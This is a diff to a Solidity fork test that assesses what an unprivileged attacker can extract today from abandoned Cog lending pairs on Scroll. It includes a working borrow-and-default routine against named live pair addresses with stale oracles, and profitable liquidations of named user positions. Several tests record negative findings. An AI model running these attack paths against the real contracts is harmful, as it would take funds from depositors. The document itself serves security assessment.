@@ -8,35 +8,31 @@ import {IERC20, ICogPair} from "../src/ICogPair.sol";
 /// @notice Verifies, against live Scroll state, what an unprivileged attacker can extract from
 ///         the abandoned Cog isolated-lending markets (paused + unpaused pairs) today.
 ///
-///  Findings verified here (see ../README.md):
-///   A. borrow-and-default on unpaused pairs whose oracle still reports a stale ratio:
-///      0x0c502351 (WETH/CRV), 0xaa230793 (rETH/USDC), 0xdefebd03 (rETH/USDC)
+///  Verified paths:
+///   A. borrow-and-default on unpaused pairs whose oracle returns a stale ratio:
+///      0x0C502351 (WETH/CRV) and 0xDeFeBD03 (rETH/USDC)
+///   A'. negative: 0xAA230793's oracle reverts "Stale Price Feed" -> borrow reverts (closed)
 ///   B. profitable liquidation of small insolvent positions on the PAUSED pair
-///      0x63fdafa5 (USDC/WETH) — pause blocks deposits/borrows, not liquidations
-///   C. the $142k WETH pair 0xa5832adc is paused -> new borrows/deposits revert
-///   D. broken-scale-rate pairs (huge rate) have ~0 borrow capacity; their funds are not borrowable
+///      0x63FdAFA5 (USDC/WETH) — pause blocks deposits/borrows, not liquidations
+///   C. the $142k WETH pair 0xA5832adC is paused -> new borrows/deposits revert
+///   D. broken-scale-rate pair 0x8b606e4a has zero usable borrow capacity
 ///
-/// Prices used for USD accounting (DefiLlama, 2026-10-12): WETH 2531.70, rETH 2964.61,
-/// USDC 1.00, CRV 0.3604 (Ethereum mainnet price; Scroll CRV has no live DEX market — bridged parity).
+/// Prices used for USD accounting (DefiLlama 2026-10-12): WETH 2531.70, rETH 2964.61,
+/// USDC 1.00, CRV 0.3604 (bridged-parity price; Scroll CRV has no live DEX market).
 contract CogZombieTest is Test {
     address constant ATTACKER = address(0xA11CE);
 
     address constant WETH = 0x5300000000000000000000000000000000000004;
-    address constant USDC = 0x06efdbff2a14a7c8e15944d1f4a48f9f95f663a4;
-    address constant USDT = 0xf55bec9cafdbe8730f096aa55dad6d22d44099df;
-    address constant CRV  = 0xb755039edc7910c1f1bd985d48322e55a31ac0bf;
-    address constant RETH = 0x53878b874283351d26d206fa512aece1bef6c0dd;
+    address constant USDC = 0x06eFdBFf2a14a7c8E15944D1F4A48F9F95F663A4;
+    address constant CRV  = 0xB755039eDc7910C1F1BD985D48322E55A31AC0bF;
+    address constant RETH = 0x53878B874283351D26d206FA512aEcE1Bef6C0dD;
 
-    // attack pairs
-    address constant P_WETH_CRV   = 0x0c502351461904cd9430eefdc7b9df1c30e74032;
-    address constant P_RETH_USDC1 = 0xaa230793737ddc517c2db9e42ca3a65178eda6d0;
-    address constant P_RETH_USDC2 = 0xdefebd03e8e339737f24b67737e9d002cb03f00b;
-    // big paused pair (protected from new borrows)
-    address constant P_BIG_WETH_USDC = 0xa5832adc1e4487b635a483722e4fc34062467479;
-    // paused pair with profitable liquidations
-    address constant P_USDC_WETH_LIQ = 0x63fdafa50c09c49f594f47ea7194b721291ec50f;
-    // broken-scale pair (rate ~1.7e21): borrow capacity ~ 0
-    address constant P_RETH_BROKEN = 0x8b606e4aa85281ed1cbec2d25baa6ab8f3541450;
+    address constant P_WETH_CRV    = 0x0C502351461904cd9430EeFdc7b9df1c30E74032; // unpaused, oracle stale
+    address constant P_RETH_USDC_2 = 0xDeFeBD03E8E339737f24B67737E9d002CB03f00b; // unpaused, oracle stale
+    address constant P_RETH_USDC_1 = 0xAA230793737DDC517c2Db9e42CA3a65178edA6D0; // unpaused, oracle REVERTS
+    address constant P_BIG_WETH_USDC = 0xA5832adC1e4487B635a483722e4fc34062467479; // paused, $142k WETH
+    address constant P_USDC_WETH_LIQ = 0x63FdAFA50C09c49F594f47EA7194b721291ec50f; // paused, dust liqs
+    address constant P_RETH_BROKEN = 0x8b606e4aa85281ed1cbeC2D25BAa6aB8F3541450; // oracle reverts
 
     // USD prices (1e18 scale)
     uint256 constant USD_WETH = 2531.70e18;
@@ -61,15 +57,19 @@ contract CogZombieTest is Test {
     }
 
     /// A. borrow-and-default: deposit (stale-priced) collateral, borrow ALL pool asset, walk away.
-    function _maxBorrowAttack(address pair, uint256 usdAsset, uint256 usdColl) internal returns (bool ok, uint256 assetOut, uint256 collIn) {
+    /// Note: debt booked by the pair includes the 0.05% borrow-opening fee, hence the 10005 factor.
+    function _maxBorrowAttack(address pair, uint256 usdAsset, uint256 usdColl)
+        internal
+        returns (bool ok, uint256 assetOut, uint256 collIn)
+    {
         ICogPair p = ICogPair(pair);
         address asset = p.asset();
         address coll = p.collateral();
-        (, uint256 rate) = p.get_exchange_rate(); // refreshes stored exchange_rate from oracle (fork-only)
+        (, uint256 rate) = p.get_exchange_rate(); // refreshes stored rate from oracle (fork-only)
         uint256 B = IERC20(asset).balanceOf(pair); // live asset liquidity
         if (B == 0 || rate == 0) return (false, 0, 0);
-        // solvency: coll*7.5e17 >= debt*rate  =>  need = ceil(B*rate/7.5e17)
-        uint256 need = (B * rate) / 7.5e17 + 1e6;
+        // solvency: coll*7.5e17 >= debt*rate, debt = B*1.0005  =>  need = ceil(B*10005*rate/(10000*7.5e17))
+        uint256 need = (B * 10005 * rate) / (10000 * 75) / 1e16 + 2;
         deal(coll, ATTACKER, need);
         vm.startPrank(ATTACKER);
         IERC20(coll).approve(pair, need);
@@ -96,59 +96,72 @@ contract CogZombieTest is Test {
         assertGt(got, 0.009e18, "extraction too small");
     }
 
-    function test_A_borrowAndDefault_RETH_USDC_1() public {
-        (bool ok, , ) = _maxBorrowAttack(P_RETH_USDC1, USD_RETH, USD_USDC);
-        assertTrue(ok, "no extraction on rETH/USDC pair 1");
-        // this pair's asset balance was 29.6 USD-equivalent at scan time
+    function test_A_borrowAndDefault_RETH_USDC() public {
+        (bool ok, uint256 got, ) = _maxBorrowAttack(P_RETH_USDC_2, USD_RETH, USD_USDC);
+        assertTrue(ok, "no extraction on rETH/USDC pair");
+        assertGt(got, 0.001e18, "extraction too small");
     }
 
-    function test_A_borrowAndDefault_RETH_USDC_2() public {
-        (bool ok, , ) = _maxBorrowAttack(P_RETH_USDC2, USD_RETH, USD_USDC);
-        assertTrue(ok, "no extraction on rETH/USDC pair 2");
-    }
+    /// A'. negative evidence: 0xAA230793's oracle has a staleness check and reverts now ->
+    /// borrow (which refreshes the rate) reverts -> the $29.65 rETH in that pair is unreachable.
+    function test_A_deadOracleBlocksBorrow() public {
+        ICogPair p = ICogPair(P_RETH_USDC_1);
+        (bool ok, ) = P_RETH_USDC_1.call(abi.encodeWithSelector(ICogPair.get_exchange_rate.selector));
+        assertFalse(ok, "expected oracle stale revert");
+        // direct physical check of what a caller sees today
+        (bool ok2, ) = P_RETH_BROKEN.call(abi.encodeWithSelector(ICogPair.get_exchange_rate.selector));
+        assertFalse(ok2, "expected oracle stale revert (broken pair)");
 
-    /// B. liquidation on a paused pair: pause does not gate liquidate().
-    function test_B_liquidate_insolvent_on_paused_pair() public {
-        ICogPair p = ICogPair(P_USDC_WETH_LIQ);
-        assertTrue(p.paused(), "expected pair paused");
-
-        // targets found by the off-chain scan (2026-10-12, block ~35.35M); top one first
-        address[5] memory users = [
-            0xf522f0672107333dc549a8acedf62746844b65ce,
-            0x23b651cd883c5995980c0f2df59c835664b7ec45,
-            0x51f7fac90778b7b2618f177d0d0b3898caf39b64,
-            0xb90df0bc8368a9fc4191d257780c677897f579d3,
-            0x3e86d833ca4a6f52a2fb835d780d774080b48e1e
-        ];
+        uint256 B = IERC20(RETH).balanceOf(P_RETH_USDC_1);
+        emit log_named_uint("unreachable_rETH_raw", B);
         deal(USDC, ATTACKER, 10_000e6);
-        uint256 totalPaid = 0;
-        uint256 totalGot = 0;
-        for (uint256 i = 0; i < users.length; i++) {
-            uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
-            uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);
-            vm.startPrank(ATTACKER);
-            IERC20(USDC).approve(P_USDC_WETH_LIQ, type(uint256).max);
-            try p.liquidate(users[i], type(uint256).max, ATTACKER) {
-                // ok
-            } catch {}
-            vm.stopPrank();
-            uint256 paid = usdcBefore - IERC20(USDC).balanceOf(ATTACKER);
-            uint256 got = IERC20(WETH).balanceOf(ATTACKER) - wethBefore;
-            totalPaid += paid;
-            totalGot += got;
-            emit log_named_address("liq_user", users[i]);
-            emit log_named_uint("liq_paid_usdc_raw", paid);
-            emit log_named_uint("liq_got_weth_raw", got);
-        }
-        assertGt(totalGot, 0, "no liquidation executed");
-        uint256 usdPaid = _usd(totalPaid, USD_USDC, 6);
-        uint256 usdGot = _usd(totalGot, USD_WETH, 18);
-        emit log_named_uint("liq_total_usd_paid", usdPaid);
-        emit log_named_uint("liq_total_usd_received", usdGot);
-        assertGt(usdGot, usdPaid, "liquidation not profitable");
+        vm.startPrank(ATTACKER);
+        IERC20(USDC).approve(P_RETH_USDC_1, 10_000e6);
+        p.add_collateral(ATTACKER, 10_000e6);
+        vm.expectRevert();
+        p.borrow(1e14, ATTACKER, ATTACKER); // reverts on oracle refresh
+        vm.stopPrank();
     }
 
-    /// C. the $142k WETH pair is paused: deposit and borrow revert; third-party withdraw needs allowance.
+    /// B. liquidation reality-check on paused pairs (pause() does not gate liquidate()).
+    ///   B1 negative: 0x63FdAFA5 is a factory-2 pair; the deployed blueprint uses LTV = 85%
+    ///      (Sourcify-verified), so its dust positions that looked liquidatable under the
+    ///      repo's 75% constant are actually solvent -> liquidate reverts.
+    ///   B2 positive: 0xA5832adC (factory-1, LTV = 75%, fork-probed) has 12 dust positions
+    ///      liquidatable for a gross ~$0.13 total -- economically below gas.
+    function test_B_liquidations() public {
+        // B1: expect "User is solvent" on the factory-2 pair
+        ICogPair p2 = ICogPair(P_USDC_WETH_LIQ);
+        assertTrue(p2.paused(), "expected pair paused");
+        address solventUser = 0xf522F0672107333dC549A8AcEDF62746844b65ce;
+        deal(USDC, ATTACKER, 1_000e6);
+        vm.startPrank(ATTACKER);
+        IERC20(USDC).approve(P_USDC_WETH_LIQ, type(uint256).max);
+        vm.expectRevert(bytes("CogPair: User is solvent"));
+        p2.liquidate(solventUser, type(uint256).max, ATTACKER);
+        vm.stopPrank();
+
+        // B2: dust liquidation on the factory-1 pair (gross-positive, sub-gas)
+        ICogPair p1 = ICogPair(P_BIG_WETH_USDC);
+        address dustUser = 0xe58C3e6d99194932F241517bD79E8f42aafcA17e;
+        deal(WETH, ATTACKER, 1e18);
+        uint256 wethBefore = IERC20(WETH).balanceOf(ATTACKER);
+        uint256 usdcBefore = IERC20(USDC).balanceOf(ATTACKER);
+        vm.startPrank(ATTACKER);
+        IERC20(WETH).approve(P_BIG_WETH_USDC, type(uint256).max);
+        p1.liquidate(dustUser, type(uint256).max, ATTACKER);
+        vm.stopPrank();
+        uint256 paid = wethBefore - IERC20(WETH).balanceOf(ATTACKER); // WETH is the asset (debt)
+        uint256 got = IERC20(USDC).balanceOf(ATTACKER) - usdcBefore;   // USDC is the collateral
+        emit log_named_uint("dust_liq_paid_weth_raw", paid);
+        emit log_named_uint("dust_liq_got_usdc_raw", got);
+        assertGt(got, 0, "dust liquidation should return collateral");
+        uint256 usdPaid = _usd(paid, USD_WETH, 18);
+        uint256 usdGot = _usd(got, USD_USDC, 6);
+        assertGt(usdGot, usdPaid, "dust liquidation should be gross-profitable");
+    }
+
+    /// C. the $142k WETH pair is paused: deposit/borrow revert; third-party withdraw needs allowance.
     function test_C_pausedPairBlocksUnprivilegedDepositAndBorrow() public {
         ICogPair p = ICogPair(P_BIG_WETH_USDC);
         assertTrue(p.paused(), "expected big pair paused");
@@ -161,29 +174,30 @@ contract CogZombieTest is Test {
         p.deposit(1e6, ATTACKER);
         vm.expectRevert(bytes("Pair Paused"));
         p.borrow(1e15, ATTACKER, ATTACKER);
-        vm.expectRevert(bytes("Pair Paused"));
-        p.borrow(1e15, address(0xdead), ATTACKER);
         // cannot withdraw somebody else's LP shares without allowance
-        address victim = address(0xeeda897df145b78e332d21c4ee45648c5d83873f); // top LP holder
+        address victim = 0xeeDa897DF145b78E332d21C4ee45648c5D83873f; // top LP holder
         vm.expectRevert(bytes("Insufficient Allowance"));
         p.withdraw(1e18, ATTACKER, victim);
         vm.stopPrank();
     }
 
-    /// D. broken-scale high-rate pair: ratio ~1.7e21 means borrow capacity is ~0
-    function test_D_brokenScalePairHasNoBorrowCapacity() public {
+    /// D. broken pair: stored rate ~1.7e21 (1e12x scale error) + dead oracle ->
+    /// $100k USDC collateral could borrow < 1 wei of rETH even if the oracle worked.
+    function test_D_brokenPairHasNoBorrowCapacity() public {
         ICogPair p = ICogPair(P_RETH_BROKEN);
         uint256 B = IERC20(RETH).balanceOf(P_RETH_BROKEN);
-        (, uint256 rate) = p.get_exchange_rate();
+        uint256 rate = p.exchange_rate();
+        uint256 capacity = (100_000e6 * 7.5e17) / rate; // rETH raw units borrowable with $100k USDC
         emit log_named_uint("broken_pair_rETH_held", B);
-        emit log_named_uint("broken_pair_rate", rate);
-        // try to borrow 0.0001 rETH with $100k USDC collateral -> still reverts
+        emit log_named_uint("broken_pair_rate_stored", rate);
+        emit log_named_uint("capacity_with_100k_usdc_raw", capacity);
+        assertLt(capacity, 1e14, "expected near-zero capacity (1e12x scale error)");
         deal(USDC, ATTACKER, 100_000e6);
         vm.startPrank(ATTACKER);
         IERC20(USDC).approve(P_RETH_BROKEN, 100_000e6);
         p.add_collateral(ATTACKER, 100_000e6);
-        vm.expectRevert(bytes("Insufficient Collateral"));
-        p.borrow(1e14, ATTACKER, ATTACKER);
+        vm.expectRevert();
+        p.borrow(1e14, ATTACKER, ATTACKER); // oracle stale revert
         vm.stopPrank();
     }
 }
